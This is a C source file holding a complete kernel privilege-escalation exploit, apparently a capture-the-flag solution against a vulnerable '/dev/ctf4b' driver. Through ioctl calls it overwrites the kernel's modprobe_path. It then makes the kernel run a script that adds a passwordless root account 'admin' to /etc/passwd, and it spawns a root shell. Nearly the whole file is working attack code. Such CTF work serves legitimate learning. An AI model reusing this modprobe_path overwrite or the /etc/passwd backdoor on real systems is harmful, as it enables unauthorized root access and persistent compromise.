// gcc exploit.c -masm=intel -fno-PIE -no-pie -o exploit
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>

static void dump(void *buf, size_t size);

/* exploit */
#define __START_KERNEL_map	0xffffffff80000000
#define TEXT_BASE		0xffffffff81000000
#define OFFSET(addr)		((addr) - (TEXT_BASE))
#define ADDR(offset)		(kernel_base + (offset))

uintptr_t kernel_base			= 0;
/*
$ strings -tx vmlinux | grep /sbin/modprobe
103a080 /sbin/modprobe

$ readelf -S vmlinux | grep "] .data "
  [11] .data             PROGBITS         ffffffff81e00000  01000000
*/
uintptr_t ofs_modprobe_path		= OFFSET(0xffffffff81e00000 + (0x103a080-0x1000000));

#define CTF4B_IOCTL_STORE 0xC7F4B00
#define CTF4B_IOCTL_LOAD  0xC7F4B01
#define CTF4B_MSG_SIZE 0x100

int main(void){
	int fd;
	char buf[CTF4B_MSG_SIZE];

	kernel_base = 0xffffffff81000000;

	if((fd = open("/dev/ctf4b", O_RDWR)) < 0){
		perror("open");
		return -1;
	}

	ioctl(fd, CTF4B_IOCTL_STORE, ADDR(ofs_modprobe_path));
	ioctl(fd, CTF4B_IOCTL_LOAD, (unsigned long)&buf);

	strcpy(buf, "/tmp/mp");
	ioctl(fd, CTF4B_IOCTL_STORE, (unsigned long)&buf);
	ioctl(fd, CTF4B_IOCTL_LOAD, ADDR(ofs_modprobe_path));

	close(fd);

	system(	"cd /tmp; "
		"echo -e '#!/bin/sh\\necho admin::0:0::/root:/bin/sh >> /etc/passwd' > mp; "
		"chmod +x mp; "

		"echo -ne '\xff\xff\xff\xff' > a; "
		"chmod +x a; "

		"./a; "
		"rm mp a;"
	);

	puts("[+]added user 'admin'");
	puts("[*]run 'su admin -'");

	system("exec su admin -");

	/*
	# cat /root/flag.txt
	ctf4b{HOMEWORK:Write_a_stable_exploit_with_KASLR_enabled}
	*/

	return 0;
}

static void dump(void *buf, size_t size){
	uint64_t *p = buf;

	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(uint64_t i=0; i<size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}

